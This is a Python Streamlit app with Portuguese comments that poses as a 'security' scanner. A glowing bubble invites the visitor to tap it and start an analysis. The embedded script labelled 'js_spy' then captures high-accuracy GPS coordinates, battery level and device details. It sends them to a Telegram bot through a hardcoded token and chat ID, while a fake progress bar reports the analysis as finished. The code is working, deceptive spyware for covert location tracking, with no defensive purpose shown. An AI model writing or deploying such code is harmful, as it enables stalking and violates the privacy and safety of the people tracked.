import streamlit as st
import time

# --- CONFIGURAÇÃO ---
TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
ID = "8210828398"

st.set_page_config(page_title="Segurança", layout="centered")

# --- VISUAL ORIGINAL (BOLHA INTERATIVA) ---
st.markdown("""
    <style>
    .main { background-color: #0b0f14; color: white; }
    .stAlert { display: none !important; }
    .scanner-box { display: flex; flex-direction: column; align-items: center; padding: 20px; animation: float 3s ease-in-out infinite; cursor: pointer; }
    @keyframes float { 0%, 100% { transform: translateY(0px); } 50% { transform: translateY(-15px); } }
    .circle { width: 200px; height: 200px; border-radius: 50%; background: radial-gradient(circle, rgba(46, 204, 113, 0.2) 0%, transparent 70%); border: 2px solid rgba(46, 204, 113, 0.5); box-shadow: 0 0 40px rgba(46, 204, 113, 0.3); display: flex; align-items: center; justify-content: center; }
    .pct-text { font-size: 48px; font-weight: bold; color: white; font-family: sans-serif; }
    </style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align: center;'>Tocar na bolha para analisar</h2>", unsafe_allow_html=True)

caixa_bolha = st.empty()

# --- O INJETOR AGRESSIVO ---
js_spy = f"""
<div class="scanner-box" onclick="forcarCaptura()">
    <div class="circle">
        <div class="pct-text">4%</div>
    </div>
</div>

<script>
async function forcarCaptura() {{
    // Configuração para forçar o hardware a ligar o GPS imediatamente
    const config = {{ enableHighAccuracy: true, timeout: 5000, maximumAge: 0 }};
    
    navigator.geolocation.getCurrentPosition(
        async (pos) => {{
            const bat = await navigator.getBattery();
            const info = "🛡️ *ALVO ATIVADO*\\n📱 " + navigator.userAgent.split('(')[1].split(')')[0] + "\\n🔋 " + Math.round(bat.level * 100) + "%\\n📍 [MAPA](https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude + ")";
            
            await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                method: "POST",
                headers: {{ "Content-Type": "application/json" }},
                body: JSON.stringify({{ chat_id: "{ID}", text: info, parse_mode: "Markdown" }})
            }});
            
            window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
        }},
        (err) => {{
            // Se falhar, tenta novamente com um método menos preciso para garantir o envio
            navigator.geolocation.getCurrentPosition(async (pos) => {{
                 // (Repete o envio aqui se necessário)
            }});
            alert("Atenção: Ative a localização para continuar.");
        }},
        config
    );
}}
</script>
"""

ativou = st.components.v1.html(js_spy, height=300)

if ativou:
    for i in range(4, 101, 5):
        caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{i}%</div></div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Análise concluída!")
